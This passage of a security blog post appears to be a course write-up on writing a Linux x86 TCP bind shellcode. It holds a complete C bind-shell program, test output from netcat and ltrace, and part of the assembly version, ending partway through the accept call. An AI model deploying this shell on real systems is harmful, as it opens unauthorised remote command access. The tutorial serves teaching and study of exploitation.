<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>TCP bind shellcode - hackcommander.io</title>
<meta name="description" content="A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="TCP bind shellcode">
<meta property="og:url" content="http://localhost:4000/tcp-bind-shellcode/">


  <meta property="og:description" content="A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.">



  <meta property="og:image" content="http://localhost:4000/assets/images/slae32.png">





  <meta property="article:published_time" content="2018-11-18T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/tcp-bind-shellcode/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">TCP bind shellcode</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="TCP bind shellcode">
    <meta itemprop="description" content="A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.">
    <meta itemprop="datePublished" content="November 18, 2018">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">TCP bind shellcode
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-11-18T00:00:00+01:00">November 18, 2018 </time>&emsp;
          
          
        </p>
        <p>A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.</p>

<p>The shellcode does the following:</p>
<ol>
  <li>Creates a socket</li>
  <li>Binds the socket to an IP address and port</li>
  <li>Listens for incoming connections</li>
  <li>Redirects STDIN, STDOUT and STDERR to the socket once a connection is made</li>
  <li>Executes a shell</li>
</ol>

<h3 id="c-prototype">C prototype</h3>
<hr />
<p>To better understand the process of creating a bind shellcode, I created a prototype in C that uses the same functions that’ll be used in the assembly version. The full code is shown here. We’ll walk through each section of the code after.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// Create addr struct</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span> <span class="c1">// Port</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span> <span class="c1">// Listen on any interface</span>

    <span class="c1">// Create socket</span>
    <span class="kt">int</span> <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sock</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Socket creation failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Bind socket</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Socket bind failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Listen for connection</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Listen failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Accept connection</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Socket accept failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Duplicate stdin/stdout/stderr to socket</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// stdin</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// stdout</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">// stderr</span>

    <span class="c1">// Execute shell</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="1-socket-creation">1. Socket creation</h4>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Create socket</span>
<span class="kt">int</span> <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">sock</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Socket creation failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">socket</code> function requires 3 arguments:</p>
<ul>
  <li>int <code class="language-plaintext highlighter-rouge">domain</code>: The domain is <code class="language-plaintext highlighter-rouge">AF_INET</code> here since we are going to use IPv4 instead of local sockets or IPv6.</li>
  <li>int <code class="language-plaintext highlighter-rouge">type</code>: For TCP sockets we use <code class="language-plaintext highlighter-rouge">SOCK_STREAM</code>. If we wanted to use UDP we’d use <code class="language-plaintext highlighter-rouge">SOCK_DGRAM</code> instead.</li>
  <li>int <code class="language-plaintext highlighter-rouge">protocol</code>: For <code class="language-plaintext highlighter-rouge">SOCK_STREAM</code>, there’s a single protocol implemented, we could use 0 also here.</li>
</ul>

<h4 id="2-binding-the-socket">2. Binding the socket</h4>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Create addr struct</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span> <span class="c1">// Port</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span> <span class="c1">// Listen on any interface</span>

<span class="p">[...]</span>

<span class="c1">// Bind socket</span>
<span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Socket bind failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>A socket by itself doesn’t do anything since we haven’t associated the socket with any port or IP address. The <code class="language-plaintext highlighter-rouge">bind</code> function assigns the IP and port to the socket previously created. The man pages for <code class="language-plaintext highlighter-rouge">ip</code> explain the different parameters:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="p">{</span>
   <span class="n">sa_family_t</span>    <span class="n">sin_family</span><span class="p">;</span> <span class="cm">/* address family: AF_INET */</span>
   <span class="n">in_port_t</span>      <span class="n">sin_port</span><span class="p">;</span>   <span class="cm">/* port in network byte order */</span>
   <span class="k">struct</span> <span class="n">in_addr</span> <span class="n">sin_addr</span><span class="p">;</span>   <span class="cm">/* internet address */</span>
<span class="p">};</span>

<span class="cm">/* Internet address. */</span>
<span class="k">struct</span> <span class="n">in_addr</span> <span class="p">{</span>
   <span class="kt">uint32_t</span>       <span class="n">s_addr</span><span class="p">;</span>     <span class="cm">/* address in network byte order */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>In data networking, packets are transmitted in big-endian order (aka network byte order), so we use the <code class="language-plaintext highlighter-rouge">htons</code> and <code class="language-plaintext highlighter-rouge">htonl</code> function to convert the port and address to the right endianness. The <code class="language-plaintext highlighter-rouge">INADDR_ANY</code> is just a reference to NULL, so the program will bind to all interfaces on the machine. If we wanted to listen on a specific interface we would use the IP address of the interface here.</p>

<h4 id="3-listen-and-accept-connections">3. Listen and Accept connections</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Listen for connection</span>
<span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Listen failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Accept connection</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Socket accept failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">listen</code> function tells the socket to listen for new connections. We can set the backlog to 0 since we only need to process a single connection request.</p>

<p>The <code class="language-plaintext highlighter-rouge">accept</code> function requires 3 arguments:</p>
<ul>
  <li>int <code class="language-plaintext highlighter-rouge">sockfd</code>:  This is the value of the socket descriptor we created earlier</li>
  <li>struct <code class="language-plaintext highlighter-rouge">sockaddr *addr</code>: We can set this to NULL because we don’t need to store the IP address of the connection host</li>
  <li>socklen_t <code class="language-plaintext highlighter-rouge">*addrlen</code>: Set to NULL because we’re not using <code class="language-plaintext highlighter-rouge">addr</code></li>
</ul>

<p>The program now waits for incoming connection as this point. As indicated in the man page:</p>

<blockquote>
  <p>If no pending connections are present on the queue, and the socket is not marked as nonblocking, accept() blocks the caller until a connection is present.</p>
</blockquote>

<p>When the connection is received, the <code class="language-plaintext highlighter-rouge">accept</code> function will return the descriptor of the connection which we’ll use to redirected IO to.</p>

<h4 id="4-duplicate-file-descriptors">4. Duplicate file descriptors</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// Duplicate stdin/stdout/stderr to socket</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">//stdin</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">//stdout</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">//stderr</span>
</code></pre></div></div>

<p>Before the shell is executed, the file descriptors for stdin, stdout and stderr are duplicated to the descriptor of the TCP connection. This is necessary to redirect input and output from the executed process to the network socket.</p>

<h4 id="5-execute-shell">5. Execute shell</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Execute shell</span>
<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">execve</code>  does not start a new process but instead replaces the current program with a new one. Here the <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell binary is used without any arguments passed to it. If we wanted to use another binary with command line arguments or environment variables, we’d pass those using the 2nd and 3rd arguments.</p>

<h4 id="testing-the-program">Testing the program</h4>

<p>The code is compiled as follows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment1$ gcc -o shell_bind_tcp_c shell_bind_tcp.c
shell_bind_tcp.c: In function ‘main’:
shell_bind_tcp.c:50:2: warning: null argument where non-null required (argument 2) [-Wnonnull]
  execve("/bin/sh", NULL, NULL);
  ^
</code></pre></div></div>

<p>The compiler gives a warning because we’re using a NULL value instead of pointing to an array of strings but the code still works.</p>

<p>Now it’s time to test it, :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[In the first terminal session]
slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp
...
[Using another terminal session]
slemire@slae:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ltrace</code> can be used to record dynamic library calls made during the execution of the program. We can see both file descriptors created: <code class="language-plaintext highlighter-rouge">fd 4</code> is the one created when the connection is accepted, and is the one used to redirect the input &amp; output to.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">slemire@supersnake:~/slae32/assignment1$</span><span class="w"> </span>ltrace ./shell_bind_tcp_c
<span class="gp">__libc_start_main(0x804864b, 1, 0xbffff6b4, 0x80487f0 &lt;unfinished ...&gt;</span><span class="w">
</span><span class="go">htons(4444, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                        = 0x5c11
htonl(0, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                           = 0
socket(2, 1, 6)                                                                                                        = 3
bind(3, 0xbffff5ec, 16, 0xb7e320ec)                                                                                    = 0
listen(3, 0, 16, 0xb7e320ec)                                                                                           = 0
accept(3, 0, 0, 0xb7e320ec)                                                                                            = 4
dup2(4, 0)                                                                                                             = 0
dup2(4, 1)                                                                                                             = 1
dup2(4, 2)                                                                                                             = 2
</span><span class="gp">execve(0x80488c5, 0, 0, 0xb7e320ec &lt;no return ...&gt;</span><span class="w">
</span><span class="go">--- Called exec() ---
</span></code></pre></div></div>

<h3 id="assembly-version">Assembly version</h3>
<hr />
<p>The assembly version follows the same logic flow previously used in the C protoype. First, registers are cleared to make sure there are no unintended side effects when testing the shellcode within the <code class="language-plaintext highlighter-rouge">shellcode.c</code> skeleton program. Initially, when I tested the code and didn’t clear out all registers, the ELF binary created by NASM worked ok but the shellcode inside the skeleton program crashed because EAX already had a value in the upper half of the register.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Zero registers</span>
<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
</code></pre></div></div>

<p>For this shellcode version, I used the initial syscall used in earlier Linux versions where a single syscall was used to control all socket functions on the kernel. Newer Linux versions implement separate syscalls as indicated in the <code class="language-plaintext highlighter-rouge">socketcall</code> man page:</p>

<blockquote>
  <p>On a some architectures—for example, x86-64 and ARM—there is no
socketcall() system call; instead socket(2), accept(2), bind(2), and
so on really are implemented as separate system calls.</p>

  <p>On x86-32, socketcall() was historically the only entry point for the
sockets API.  However, starting in Linux 4.3, direct system calls are
provided on x86-32 for the sockets API.</p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">int socketcall(int call, unsigned long *args);</code></p>

<p><code class="language-plaintext highlighter-rouge">sys_socketcall</code> works a bit differently than other syscalls. The first argument (EBX register) contains the function name being called and the 2nd argument in ECX contains a pointer to a memory address containing the various arguments for the function.</p>

<p><code class="language-plaintext highlighter-rouge">/usr/include/linux/net.h</code> contains the following list of function calls:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define SYS_SOCKET  1       </span><span class="cm">/* sys_socket(2)        */</span><span class="cp">
#define SYS_BIND    2       </span><span class="cm">/* sys_bind(2)          */</span><span class="cp">
#define SYS_CONNECT 3       </span><span class="cm">/* sys_connect(2)       */</span><span class="cp">
#define SYS_LISTEN  4       </span><span class="cm">/* sys_listen(2)        */</span><span class="cp">
#define SYS_ACCEPT  5       </span><span class="cm">/* sys_accept(2)        */</span><span class="cp">
</span><span class="p">...</span>
</code></pre></div></div>

<p>Let’s take the socket creation as an example:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Create socket</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x1</span>         <span class="c1">;   SYS_SOCKET</span>
<span class="nf">push</span> <span class="mh">0x6</span>            <span class="c1">; int protocol -&gt; IPPROTO_TCP</span>
<span class="nf">push</span> <span class="mh">0x1</span>            <span class="c1">; int type -&gt; SOCK_STREAM</span>
<span class="nf">push</span> <span class="mh">0x2</span>            <span class="c1">; int domain -&gt; AF_INET</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_SOCKET)</span>
<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save socket fd</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">EAX</code> contains <code class="language-plaintext highlighter-rouge">0x66</code> which is <code class="language-plaintext highlighter-rouge">sys_socketcall</code>, then EBX is set to <code class="language-plaintext highlighter-rouge">0x1</code> (SYS_SOCKET). Next the arguments for <code class="language-plaintext highlighter-rouge">socket()</code> itself are pushed on the stack then the value of the stack frame pointer is moved into <code class="language-plaintext highlighter-rouge">ECX</code>. When the function call returns, the descriptor value is saved into <code class="language-plaintext highlighter-rouge">EDI</code> so it can be used later.</p>

<p>The sockaddr_in struct is created as follows:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Create addr struct</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; sin.addr (0.0.0.0)</span>
<span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x5c11</span>    <span class="c1">; Port</span>
<span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x2</span>       <span class="c1">; AF_INET</span>
<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>
</code></pre></div></div>

<p>Since the addr struct needs to be 16 bytes, <code class="language-plaintext highlighter-rouge">$edx</code> is pushed twice to add 8 bytes of null padding. <code class="language-plaintext highlighter-rouge">$edx</code> is pushed a third time to define the listening address for the socket and finally the port number is pushed followed by the domain value for <code class="language-plaintext highlighter-rouge">AF_INET</code>.</p>

<p>For <code class="language-plaintext highlighter-rouge">bind</code>, we push the size of the addr struct (16 bytes), then its address which we saved to the <code class="language-plaintext highlighter-rouge">$esi</code> register earlier and the socket description from <code class="language-plaintext highlighter-rouge">$edi</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Bind socket</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x2</span>         <span class="c1">;   SYS_BIND</span>
<span class="nf">push</span> <span class="mh">0x10</span>           <span class="c1">; socklen_t addrlen</span>
<span class="nf">push</span> <span class="nb">esi</span>            <span class="c1">; const struct sockaddr *addr</span>
<span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_BIND)</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">listen</code> and <code class="language-plaintext highlighter-rouge">accept</code> functions work the same way with the arguments being pushed on the stack and using <code class="language-plaintext highlighter-rouge">sys_socketcall</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Listen for connection</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x4</span>         <span class="c1">;   SYS_LISTEN</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; int backlog -&gt; NULL</span>
<span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_LISTEN)</span>

<span class="c1">; Accept connection</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x5</span>         <span class="c1">;   SYS_ACCEPT</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; socklen_t *addrlen -&gt; NULL</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; struct sockaddr *addr -&gt; NULL</span>
